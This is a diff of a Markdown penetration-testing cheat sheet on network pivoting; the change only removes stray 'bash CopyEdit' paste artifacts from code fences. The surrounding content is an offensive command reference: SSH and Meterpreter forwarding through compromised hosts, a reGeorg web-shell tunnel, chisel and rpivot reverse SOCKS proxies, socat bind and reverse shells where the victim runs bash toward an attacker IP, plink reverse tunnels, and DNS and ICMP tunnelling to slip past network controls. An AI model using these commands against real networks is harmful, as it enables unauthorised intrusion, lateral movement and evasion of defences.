@@ -5,8 +5,7 @@
 ### SSH Graphical Connection (X11 Forwarding)
 
 ```bash
-bash
-CopyEdit
+
 ssh -Y -C <user>@<ip>
 # -Y: Enables trusted X11 forwarding (faster, but less secure than -X)
 # -C: Compresses data during transfer (faster for slow connections)
@@ -21,8 +20,7 @@ ssh -Y -C <user>@<ip>
 Open a port on the SSH server and map it to a different internal port.
 
 ```bash
-bash
-CopyEdit
+
 ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1
 # Now, port 1521 on the SSH server is accessible via port 10521 externally
 
@@ -34,8 +32,7 @@ proxychains4 crackmapexec smb 10.10.10.0/24 #Example
 ```
 
 ```bash
-bash
-CopyEdit
+
 ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1
 # Access internal IP 10.0.0.1:1521 through the server's 10521 port
 
@@ -48,8 +45,7 @@ ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1
 Redirect a port through a compromised SSH machine to another target machine.
 
 ```bash
-bash
-CopyEdit
+
 ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<target_ip>:<target_port> [-p <ssh_port>] [-N -f]
 # -L: Local port forwarding
 # -N: Don't execute a remote command
@@ -60,8 +56,7 @@ ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<target_ip>:<target_po
 Example:
 
 ```bash
-bash
-CopyEdit
+
 sudo ssh -L 631:<target_ip>:631 -N -f -l <username> <compromised_ip>
 
 ```
@@ -73,8 +68,7 @@ sudo ssh -L 631:<target_ip>:631 -N -f -l <username> <compromised_ip>
 Use SSH to create a SOCKS proxy through the compromised host.
 
 ```bash
-bash
-CopyEdit
+
 ssh -f -N -D <local_port> <username>@<ip_compromised>
 # -D: Dynamic application-level port forwarding (SOCKS proxy)
 
@@ -101,8 +95,7 @@ PermitTunnel yes
 Create tun interfaces:
 
 ```bash
-bash
-CopyEdit
+
 ssh root@server -w any:any
 # After connection:
 ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0  # Client
@@ -113,8 +106,7 @@ ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0  # Server
 Enable routing and NAT on the server:
 
 ```bash
-bash
-CopyEdit
+
 echo 1 > /proc/sys/net/ipv4/ip_forward
 iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
 
@@ -123,8 +115,7 @@ iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
 Route traffic on client:
 
 ```bash
-bash
-CopyEdit
+
 route add -net 10.0.0.0/16 gw 1.1.1.1
 
 ```
@@ -136,8 +127,7 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 Tunnel all traffic to a subnet through a compromised SSH host.
 
 ```bash
-bash
-CopyEdit
+
 pip install sshuttle
 sshuttle -r user@host 10.10.10.0/24
 # Routes all traffic destined for 10.10.10.0/24 through SSH
@@ -153,8 +143,7 @@ Inside a Meterpreter session:
 ### Port Forwarding (Meterpreter `portfwd`)
 
 ```bash
-bash
-CopyEdit
+
 portfwd add -l <local_port> -p <remote_port> -r <remote_host>
 # Local -> Compromised -> Remote
 
@@ -163,8 +152,7 @@ portfwd add -l <local_port> -p <remote_port> -r <remote_host>
 ### SOCKS Proxy with Meterpreter
 
 ```bash
-bash
-CopyEdit
+
 background
 route add <victim_ip> <netmask> <session_id>
 
@@ -179,8 +167,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf
 Alternatively, with `autoroute`:
 
 ```bash
-bash
-CopyEdit
+
 background
 use post/multi/manage/autoroute
 set SESSION <session_id>
@@ -203,8 +190,7 @@ run
 Pivot through a web shell tunnel (PHP/JSP/ASPX).
 
 ```bash
-bash
-CopyEdit
+
 python reGeorgSocksProxy.py -p 8080 -u http://<victim_ip>/path/to/tunnel.jsp
 
 ```
@@ -221,8 +207,7 @@ Fast TCP tunneling over HTTP using client-server setup.
 - **SOCKS Proxy:**
 
 ```bash
-bash
-CopyEdit
+
 ./chisel server -p 8080 --reverse
 ./chisel client <attacker_ip>:8080 R:socks
 
@@ -231,8 +216,7 @@ CopyEdit
 - **Port Forwarding:**
 
 ```bash
-bash
-CopyEdit
+
 ./chisel server -p 12312 --reverse
 ./chisel client <attacker_ip>:12312 R:<local_port>:<target_ip>:<target_port>
 
@@ -250,8 +234,7 @@ Reverse SOCKS proxy pivoting.
 - **Attacker:**
 
 ```bash
-bash
-CopyEdit
+
 python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
 
 ```
@@ -259,8 +242,7 @@ python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --p
 - **Victim:**
 
 ```bash
-bash
-CopyEdit
+
 python client.py --server-ip <attacker_ip> --server-port 9999
 
 ```
@@ -277,8 +259,7 @@ Versatile data relay tool.
 - **Bind Shell:**
 
 ```bash
-bash
-CopyEdit
+
 victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
 attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
 
@@ -287,8 +268,7 @@ attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
 - **Reverse Shell:**
 
 ```bash
-bash
-CopyEdit
+
 attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
 victim> socat TCP:<attacker_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 
@@ -297,8 +277,7 @@ victim> socat TCP:<attacker_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 - **Port Forwarding via SOCKS:**
 
 ```bash
-bash
-CopyEdit
+
 socat TCP-LISTEN:<local_port>,fork SOCKS4A:127.0.0.1:<target_host>:<target_port>,socksport=<proxy_port>
 
 ```
@@ -306,8 +285,7 @@ socat TCP-LISTEN:<local_port>,fork SOCKS4A:127.0.0.1:<target_host>:<target_port>
 - **SSL Socat Tunnel:**
 
 ```bash
-bash
-CopyEdit
+
 attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
 victim> socat TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt
 
@@ -320,8 +298,7 @@ victim> socat TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt
 Command-line SSH client, great for reverse tunnels.
 
 ```bash
-bash
-CopyEdit
+
 plink.exe -l <username> -pw <password> -R <local_port>:<target_ip>:<target_port> <attacker_ip>
 
 ```
@@ -329,8 +306,7 @@ plink.exe -l <username> -pw <password> -R <local_port>:<target_ip>:<target_port>
 Example:
 
 ```bash
-bash
-CopyEdit
+
 plink.exe -l root -pw password -R 9090:127.0.0.1:9090 10.11.0.41
 
 ```
@@ -343,8 +319,7 @@ plink.exe -l root -pw password -R 9090:127.0.0.1:9090 10.11.0.41
 - Using **OpenVPN** with NTLM proxy:
 
 ```bash
-bash
-CopyEdit
+
 http-proxy <proxy_ip> 8080 <credentials_file> ntlm
 
 ```
@@ -352,8 +327,7 @@ http-proxy <proxy_ip> 8080 <credentials_file> ntlm
 - Using **Cntlm** proxy tool:
 
 ```
-text
-CopyEdit
+
 Username Alice
 Password P@ssw0rd
 Domain CONTOSO.COM
@@ -374,8 +348,7 @@ Tunnel 2222:<attacker_machine>:443
 - **Iodine (root required):**
 
 ```bash
-bash
-CopyEdit
+
 iodined -f -c -P password 1.1.1.1 domain.com #Server
 iodine -f -P password domain.com -r           #Client
 
@@ -384,8 +357,7 @@ iodine -f -P password domain.com -r           #Client
 - **DNSCat2 (no root needed):**
 
 ```bash
-bash
-CopyEdit
+
 attacker> ruby dnscat2.rb domain.com
 victim> ./dnscat2 domain.com
 
@@ -398,8 +370,7 @@ victim> ./dnscat2 domain.com
 - Root access needed to create tun interfaces.
 
 ```bash
-bash
-CopyEdit
+
 hans -v -f -s 1.1.1.1 -p password
 hans -f -c <server_ip> -p password -v
 
